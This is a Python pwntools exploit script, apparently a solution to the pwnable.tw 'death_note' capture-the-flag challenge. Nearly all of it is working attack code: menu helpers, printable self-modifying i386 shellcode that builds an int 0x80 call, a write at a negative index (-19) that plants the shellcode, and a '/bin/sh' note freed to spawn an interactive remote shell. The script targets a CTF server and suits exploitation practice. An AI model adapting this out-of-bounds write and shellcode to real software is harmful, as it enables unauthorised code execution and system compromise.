from pwn import *

def show(idx):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', str(idx))
	r.recvuntil(':')

def add(idx, content):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', content)

def remove(idx):
	r.sendlineafter(':', '3')
	r.sendlineafter(':', str(idx))

shellcode = asm('''
		pop ecx
		pop ecx
		pop eax
		sub al,0x41
		sub al,0x41
		xor BYTE PTR [ecx+0x42],al
		inc ecx
		xor al,0x41
		xor BYTE PTR [ecx+0x42],al
		dec ecx
		push ecx
		pop ebx
		push edx
		pop ecx
		and al,0x41
		and al,0x41
		and al,0x41
		and al,0x41
		and al,0x41
		and al,0x41
		and al,0x41
		and al,0x41
		sub al,0x41
		inc eax
		inc eax
		inc eax
		inc eax
		inc eax
		inc eax
		inc eax
		inc eax
		inc eax
		inc eax
		inc eax
		dec ebp # cd
		inc ecx # 80
  ''', os='linux', arch='i386')

r = remote('chall.pwnable.tw', 10201)
#r = process('./death_note')

add(0, "/bin/sh\x00")
add(-19, shellcode)
remove(0) 
r.interactive()